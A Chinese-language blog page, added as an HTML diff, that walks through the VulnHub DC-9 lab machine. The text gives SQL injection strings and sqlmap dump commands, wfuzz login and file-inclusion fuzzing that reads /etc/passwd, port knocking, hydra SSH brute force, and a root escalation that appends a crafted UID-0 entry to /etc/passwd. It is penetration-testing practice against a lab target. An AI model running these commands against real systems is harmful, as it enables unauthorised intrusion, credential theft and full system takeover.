@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        DC-9 | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">DC-9</div>
+        <div class="post-info">
+          
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a>
+
+
+          <span class="post-date">2023-03-19</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">信息收集</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">SQl注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">本地文件包含</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">Hydra字典爆破连接</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">隐藏文件</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">添加用户提权</span></a></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+
+<p><a name="GLrzP"></a></p>
+<h1><span id="信息收集">信息收集</span></h1><p>arp-scan -l<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642743304546-a71f7d7e-a722-40d3-8a5e-7d87b981355d.png#clientId=u94e44d79-6e06-4&from=paste&height=86&id=u58f9cc96&name=image.png&originHeight=172&originWidth=842&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21301&status=done&style=none&taskId=u281bd03e-aadc-42db-b09b-a64e57411cc&title=&width=421" alt="image.png"><br>发现192.168.119.155 IP 段<br>扫描端口 –服务<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642743455966-48788aa8-28b7-4280-85c2-124c0bb585fe.png#clientId=u94e44d79-6e06-4&from=paste&height=195&id=u6decfb1d&name=image.png&originHeight=390&originWidth=952&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44907&status=done&style=none&taskId=u7dcc2e5e-6679-4c11-b573-99a474fab61&title=&width=476" alt="image.png"><br>22 端口 — 80 端口 <br>这里22端口有一个（filtered）过滤的保护<br>先针对80端口进行一个查看<br>这是一个员工详细表 —–那就是说可以查看员工信息 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642743663526-6a31b84b-7e27-474d-b6e5-787dcd51f3b5.png#clientId=u94e44d79-6e06-4&from=paste&height=292&id=u1c02e8ca&name=image.png&originHeight=584&originWidth=1151&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55553&status=done&style=none&taskId=u304de723-26bc-4e04-92c2-e42bf978dc9&title=&width=575.5" alt="image.png"><br>发现一个查询框和一个登录框 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642743992895-2764c63e-eee6-472a-ace9-126076ddb449.png#clientId=u94e44d79-6e06-4&from=paste&height=136&id=u4aa76bba&name=image.png&originHeight=271&originWidth=602&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13247&status=done&style=none&taskId=u26342627-ada9-4546-bf3f-083c06bbddc&title=&width=301" alt="image.png">	    <img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642744010631-615da956-fe73-45aa-bdc4-bc5346e32c3b.png#clientId=u94e44d79-6e06-4&from=paste&height=219&id=u03f9ea39&name=image.png&originHeight=437&originWidth=798&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20434&status=done&style=none&taskId=ud4d32294-8fbc-486c-9be1-7e7c9aeab97&title=&width=399" alt="image.png"></p>
+<p>1：查询框是否存在SQL注入呢 <br>2：登录框是否可以弱口令暴力破解呢<br>** nikto -host 192.168.119.155  (web 漏洞扫描工具)**<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642744458056-e18ecea0-e92b-4ea2-a4c2-0b80233dc205.png#clientId=u94e44d79-6e06-4&from=paste&height=236&id=ucd5f336e&name=image.png&originHeight=472&originWidth=1108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64850&status=done&style=none&taskId=u2208ccc0-6976-4498-8e8e-322ef662560&title=&width=554" alt="image.png"><br>发现了 &#x2F;config.php: PHP Config file may contain database IDs and passwords.<br>说可能存在数据库ID账号密码 <br>。。 一片空白没有啥 —下面还有一个网页<br>这像是一个文件包含文件上传啊<br>还有几个网页也都没有什么信息 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642744840460-bb91b067-f625-48cc-b7cd-7e43ceea89f1.png#clientId=u94e44d79-6e06-4&from=paste&height=177&id=uff8737bb&name=image.png&originHeight=353&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40538&status=done&style=none&taskId=u1821a933-6fe1-496c-b666-2e567ebfcb5&title=&width=442" alt="image.png"><br>返回 页面<br><a name="Iqoa3"></a></p>
+<h1><span id="sql注入">SQl注入</span></h1><p>测试能否存在SQl注入<br>1’or’1’&#x3D;’1<br>‘ or 1&#x3D;1 #<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642745395798-de0d091e-0e1b-4d37-9098-27c39e072220.png#clientId=u94e44d79-6e06-4&from=paste&height=170&id=u3372283b&name=image.png&originHeight=340&originWidth=710&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15413&status=done&style=none&taskId=ud9af8d1a-a081-4d23-b756-e51617cd173&title=&width=355" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642746618429-9a528a48-2655-45ec-8d8a-86b1d7710b84.png#clientId=u94e44d79-6e06-4&from=paste&height=362&id=u17b53f3e&name=image.png&originHeight=724&originWidth=692&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63140&status=done&style=none&taskId=u0ea94686-fb78-4386-819d-9422462f906&title=&width=346" alt="image.png"><br>存在SQL注入<br>是POST传参的方式<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642746794374-8684c9d0-6163-4bc1-af40-25ffac8543d5.png#clientId=u94e44d79-6e06-4&from=paste&height=148&id=u2858b603&name=image.png&originHeight=295&originWidth=1171&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32626&status=done&style=none&taskId=u4e2f571a-d801-4e4c-9491-36ba954e9a4&title=&width=585.5" alt="image.png"><br>使用SQlmap 工具 查询<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.119.155/results.php%22">http://192.168.119.155/results.php"</a> –data&#x3D;”search&#x3D;1”   <br>扫出来了 大概率使用mysql注入的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642747440919-fa9eb943-4b0c-4055-a7e4-c466d8821efd.png#clientId=u94e44d79-6e06-4&from=paste&height=244&id=u9256dff6&name=image.png&originHeight=487&originWidth=986&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61748&status=done&style=none&taskId=u92e58ff4-709d-4980-a03f-91563c573cd&title=&width=493" alt="image.png"><br>基于时间的盲注<br>组合注入<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642747529516-deaef3bb-1086-4169-ba10-dc6bda4bb80b.png#clientId=u94e44d79-6e06-4&from=paste&height=222&id=u35da95ba&name=image.png&originHeight=443&originWidth=1060&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64422&status=done&style=none&taskId=uc2849a47-b071-47ef-8cf6-b515765b9ff&title=&width=530" alt="image.png"><br> sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.119.155/results.php%22">http://192.168.119.155/results.php"</a> –data&#x3D;”search&#x3D;1” –dbs<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642747662754-4c3c5b07-33ff-463f-8572-6e8af1b3d0aa.png#clientId=u94e44d79-6e06-4&from=paste&height=106&id=u465240ff&name=image.png&originHeight=212&originWidth=764&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20904&status=done&style=none&taskId=u6e5b3355-bd57-4b9c-b020-98c1d8c77e3&title=&width=382" alt="image.png"><br>有三个数据库<br>这个肯定得先看users 数据库<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.119.155/results.php%22">http://192.168.119.155/results.php"</a> –data&#x3D;”search&#x3D;1” -D users –tables<br>有一个数据表UserDetails <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642747851057-7b6aa49b-5287-4737-b9da-76fcc6b6d80b.png#clientId=u94e44d79-6e06-4&from=paste&height=122&id=ubd99cfa3&name=image.png&originHeight=244&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19629&status=done&style=none&taskId=ua5638242-574e-4b70-bd28-7034f8715ad&title=&width=288" alt="image.png"><br> sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.119.155/results.php%22">http://192.168.119.155/results.php"</a> –data&#x3D;”search&#x3D;1” -D users -T UserDetails –dump<br>一个用户表 —尝试登录一下  <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642748006253-8a39ec66-b043-47bb-b2b0-31027d05f380.png#clientId=u94e44d79-6e06-4&from=paste&height=261&id=u45f50e7c&name=image.png&originHeight=522&originWidth=798&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69225&status=done&style=none&taskId=u58267728-e700-4b11-afab-09c784a2abb&title=&width=399" alt="image.png"><br>发现用户密码尝试一下暴力破解<br>把用户和密码添加到一个字典 <br>使用FUZZ<br> wfuzz -z file,user_dict.txt -z file,passwd_dict.txt -d “username&#x3D;FUZZ&amp;password&#x3D;FUZ2Z” <a target="_blank" rel="noopener" href="http://192.168.119.155/manage.php">http://192.168.119.155/manage.php</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642749400145-ee130ca1-4d89-49f0-bdd8-ebcbd4a38676.png#clientId=u94e44d79-6e06-4&from=paste&height=60&id=u97110c2b&name=image.png&originHeight=120&originWidth=528&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6134&status=done&style=none&taskId=ue52e98e1-b47f-42b5-aa95-2077c3838ef&title=&width=264" alt="image.png"><br>过滤一下<br>wfuzz –hw 93 -z file,user_dict.txt -z file,passwd_dict.txt -d “username&#x3D;FUZZ&amp;password&#x3D;FUZ2Z” <a target="_blank" rel="noopener" href="http://192.168.119.155/manage.php">http://192.168.119.155/manage.php</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642749412264-246a9116-94b7-408b-a3ff-25e9b910501b.png#clientId=u94e44d79-6e06-4&from=paste&height=83&id=u71759ad0&name=image.png&originHeight=165&originWidth=653&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8842&status=done&style=none&taskId=u8c057805-8b26-4638-b009-4524d000f92&title=&width=326.5" alt="image.png"><br>结果都没有 那再测试一下另外一个数据库</p>
+<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.119.155/results.php%22">http://192.168.119.155/results.php"</a> –data&#x3D;”search&#x3D;1” -D Staff –tables<br>这里也有一个users 数据表查看一下 这个里面是不是会才是对的<img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642749503407-e274b8c7-4fbb-4dcf-aa51-85aa88499520.png#clientId=u94e44d79-6e06-4&from=paste&height=95&id=u5e593af3&name=image.png&originHeight=189&originWidth=1005&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14513&status=done&style=none&taskId=u248afcd7-fd6e-4719-a59b-939836f78ff&title=&width=502.5" alt="image.png"><br>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.119.155/results.php%22">http://192.168.119.155/results.php"</a> –data&#x3D;”search&#x3D;1” -D Staff -T Users –dump <br>扫出来了一个账号密码  是一个md5 加密的<br>密码已经哈希碰撞出来了 （transorbital1）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642749777178-b636f152-bfca-4ead-90b1-3be1ad4e362a.png#clientId=u94e44d79-6e06-4&from=paste&height=252&id=ud6fdac75&name=image.png&originHeight=503&originWidth=1115&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61649&status=done&style=none&taskId=u6364c5b8-961c-46c8-823c-bdbfdef1066&title=&width=557.5" alt="image.png"><br>登录一下 <br>结果登录成功了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642749915172-3fca4c0b-6af5-47b2-a219-bbd9986ad903.png#clientId=u94e44d79-6e06-4&from=paste&height=286&id=u749a2856&name=image.png&originHeight=572&originWidth=1144&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45772&status=done&style=none&taskId=u21073c37-4ff4-4af1-909c-b038bee1ea1&title=&width=572" alt="image.png"><br>本来打算在Add Record 添加一句话试一下 好像不行<br><a name="Tv7ax"></a></p>
+<h1><span id="本地文件包含">本地文件包含</span></h1><p>**File does not exis   file很有可能存在文件包含 **<br><strong>wfuzz 测试一下</strong><br> wfuzz   -b ‘PHPSESSID&#x3D;j8d0k7trk2maekqj955j4d3fn5’ -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt <a target="_blank" rel="noopener" href="http://192.168.119.155/manage.php?FUZZ=../../../../../etc/passw">http://192.168.119.155/manage.php?FUZZ=../../../../../etc/passw</a>d<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642750832770-83b6a302-8595-4c77-8232-82760f162276.png#clientId=u94e44d79-6e06-4&from=paste&height=264&id=ua0f0bc65&name=image.png&originHeight=527&originWidth=998&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53891&status=done&style=none&taskId=ue73bd127-ab4f-45fd-b7f0-cf95680609a&title=&width=499" alt="image.png"><br> wfuzz –hw 100  -b ‘PHPSESSID&#x3D;j8d0k7trk2maekqj955j4d3fn5’ -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt <a target="_blank" rel="noopener" href="http://192.168.119.155/manage.php?FUZZ=../../../../../etc/passwd">http://192.168.119.155/manage.php?FUZZ=../../../../../etc/passwd</a><br>存在file 文件包含<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642750773910-27a0ed3c-839c-44dd-afa2-eeb889551821.png#clientId=u94e44d79-6e06-4&from=paste&height=238&id=ufdb7a29c&name=image.png&originHeight=476&originWidth=1132&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52349&status=done&style=none&taskId=uee6fdfb5-9c3f-4954-af89-14c4c35beed&title=&width=566" alt="image.png"><br>访问一下 ——果然是存在本地文件包含的<br><a name="t4BYN"></a></p>
+<h1><span id="hydra字典爆破连接">Hydra字典爆破连接</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642750909045-4e2b02ad-a02e-41c0-be72-60954ff8de3d.png#clientId=u94e44d79-6e06-4&from=paste&height=467&id=uf25b86d0&name=image.png&originHeight=933&originWidth=1407&originalType=binary&ratio=1&rotation=0&showTitle=false&size=266911&status=done&style=none&taskId=u885d0268-dc71-4dac-9d9a-046effefb2e&title=&width=703.5" alt="image.png"><br>这是一个系统的用户和之前的第一个users 相似 尝试一下破解<br>ssh 使用字典连接<br>出现错误 是因为开头就说了他好像带有过滤 <br>使用了端口敲门服务<br><strong>Port Knocking</strong><br>原理简单分析：<br>端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642751261496-96c54bae-77c6-4701-bd0a-190938e9c974.png#clientId=u94e44d79-6e06-4&from=paste&height=110&id=u407e008f&name=image.png&originHeight=220&originWidth=789&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32773&status=done&style=none&taskId=u776c2572-ffb3-4914-9497-2e31c6b5868&title=&width=394.5" alt="image.png"><br>在&#x2F;etc&#x2F;knockd 配置文件 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642751416139-83002e6b-e480-41e4-99dd-014d3ea4dc3f.png#clientId=u94e44d79-6e06-4&from=paste&height=159&id=u20d0e422&name=image.png&originHeight=318&originWidth=1083&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47420&status=done&style=none&taskId=u48d619da-cf02-41e8-b009-8d474005f14&title=&width=541.5" alt="image.png"><br>访问<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642751508246-9bdbaa69-3375-42a8-a76e-79b6f428d670.png#clientId=u94e44d79-6e06-4&from=paste&height=328&id=u0580323c&name=image.png&originHeight=656&originWidth=1421&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89089&status=done&style=none&taskId=u8349a9b7-267c-4d5e-ae14-db54315a968&title=&width=710.5" alt="image.png"><br>必须要敲7469,8547,9842<br>可以使用nmap -p <br>for x in 7469 8475 9842 22 ;do nc 192.168.119.155 $x;done<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642751699007-4d427124-81dd-4487-a218-d6a227dd37f6.png#clientId=u94e44d79-6e06-4&from=paste&height=73&id=ua6c7cdb6&name=image.png&originHeight=145&originWidth=666&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21502&status=done&style=none&taskId=ud6fea3ed-aea8-4fa3-bc2b-13c98705f7a&title=&width=333" alt="image.png"><br>再次尝试 <br>hydra -L user_dict.txt -P passwd_dict.txt 192.168.119.155 ssh  <br>有三个shh用户可以连接<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642752163302-19b063be-1a95-48a1-a081-259dc796915a.png#clientId=u94e44d79-6e06-4&from=paste&height=169&id=u3c0c5d99&name=image.png&originHeight=337&originWidth=964&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58382&status=done&style=none&taskId=ucf34e19e-60c4-43d8-a506-0fdc1d7b6bd&title=&width=482" alt="image.png"><br>连接一下 —登录成功<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642752663000-56718536-0941-4a0b-a329-ab026653969a.png#clientId=u94e44d79-6e06-4&from=paste&height=127&id=uab1d2080&name=image.png&originHeight=254&originWidth=806&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29465&status=done&style=none&taskId=u3f1ebf1f-f316-478e-8411-d10e041373f&title=&width=403" alt="image.png"><br><a name="cQYxW"></a></p>
+<h1><span id="隐藏文件">隐藏文件</span></h1><p>ls -a  查看隐藏的文件<br>只有 janitor 用户有一个可疑的隐藏文件 –其他都没有<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642752912898-2d3222a1-2b37-4260-a17d-d3774a0da1ff.png#clientId=u94e44d79-6e06-4&from=paste&height=19&id=u57a2928f&name=image.png&originHeight=37&originWidth=509&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3765&status=done&style=none&taskId=uc6495780-4ef6-40c4-8743-c00c9251ab5&title=&width=254.5" alt="image.png"><br>有一个密码文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642752948902-6d9a181f-b9d3-4704-93c2-fffe8d7a22ac.png#clientId=u94e44d79-6e06-4&from=paste&height=137&id=ua73b90e9&name=image.png&originHeight=274&originWidth=746&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24473&status=done&style=none&taskId=u69518160-109d-4da2-9ef5-682e2335859&title=&width=373" alt="image.png"><br>发现了这个密码 猜想是不是还有其他的用户刚才的密码不匹配把这个几个密码加上试一下<br>发现一个新的用户尝试登录<br><a name="ZKp3L"></a></p>
+<h1><span id="添加用户提权">添加用户提权</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642753196255-5b4dfd9c-8b50-40db-8cea-a221e0f9ed6f.png#clientId=u94e44d79-6e06-4&from=paste&height=19&id=u89c007fd&name=image.png&originHeight=38&originWidth=695&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7117&status=done&style=none&taskId=ua3c2e2b6-4e81-4710-8f89-83ec930a2d6&title=&width=347.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642753171243-a67a326d-5a13-404a-a984-f5ebae7e37cc.png#clientId=u94e44d79-6e06-4&from=paste&height=146&id=u455cfbe7&name=image.png&originHeight=292&originWidth=781&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32371&status=done&style=none&taskId=u384c5bc8-ee77-48d9-880c-8b9ab2fc45d&title=&width=390.5" alt="image.png"><br>sudo -l  查看那些文件是使用root权限可执行的<br>真的有<br>可以看到fredf可以不用密码以root权限执行&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test的文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642753256238-1279c606-5332-4169-9c9a-e25f3e6e2521.png#clientId=u94e44d79-6e06-4&from=paste&height=94&id=u8877207d&name=image.png&originHeight=188&originWidth=1032&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28221&status=done&style=none&taskId=ua0c63bb8-0249-4256-8083-b49ec4ade31&title=&width=516" alt="image.png"><br>进入opt&#x2F;devstuff&#x2F;dist&#x2F;test 发现是python文件<br>查找一下python 可执行文件<br>find &#x2F; -name “test.py” 2&gt;&#x2F;dev&#x2F;null<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642753713673-d1f7c6d7-d54f-4c5d-8a8d-2509619c1c69.png#clientId=u94e44d79-6e06-4&from=paste&height=52&id=u981968af&name=image.png&originHeight=104&originWidth=732&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12625&status=done&style=none&taskId=u2ef999d9-c306-43aa-ab20-f1860c094a7&title=&width=366" alt="image.png"><br>找到一个test.py 在&#x2F;opt&#x2F;devstuff<br>查看源码 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642753800170-caf678fe-1f3a-4a84-bc6a-174d61039729.png#clientId=u94e44d79-6e06-4&from=paste&height=165&id=udc7ae923&name=image.png&originHeight=329&originWidth=631&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22199&status=done&style=none&taskId=u9400962c-510e-4d1a-9475-9cc385e3c06&title=&width=315.5" alt="image.png"><br>fredf 用户可以用root的身份去执行test程序<br>test可以读取任意文本内容 ，追加到任意文本里面<br>这里直接添加一个管理员文本，添加到&#x2F;etc&#x2F;passwd文件里面去）<br>openssl 加密<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642754474393-1a9f65d9-75c3-4492-9222-0011cc568687.png#clientId=u94e44d79-6e06-4&from=paste&height=28&id=u6c4ca84f&name=image.png&originHeight=55&originWidth=597&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6659&status=done&style=none&taskId=u05cb4d75-4a2e-4842-9ea6-bc10a8071ad&title=&width=298.5" alt="image.png"><br>写入&#x2F;tmp目录下<br><strong>echo ‘aaaa:$1$aaaa$6q.rdPNbxQRHQa&#x2F;Hb6h0B1:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash’ &gt;&gt; &#x2F;tmp&#x2F;passwd</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642755060882-47437c5d-9f09-4a97-94df-1c57a29763de.png#clientId=u94e44d79-6e06-4&from=paste&height=63&id=u8ecbe416&name=image.png&originHeight=126&originWidth=897&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13580&status=done&style=none&taskId=u16331675-8760-41a0-8e32-65aff54bf06&title=&width=448.5" alt="image.png"><br>提权成功<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642755099947-79cfa270-f146-4324-97f4-3278b80c9c22.png#clientId=u94e44d79-6e06-4&from=paste&height=295&id=u71d55b15&name=image.png&originHeight=590&originWidth=857&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48425&status=done&style=none&taskId=u213ca4a5-2468-467b-bf9c-20e32f19bb1&title=&width=428.5" alt="image.png"></p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/19/Challenge-1-10/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>Challenge-1-10</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/10/PTE2003/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      PTE-2003
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
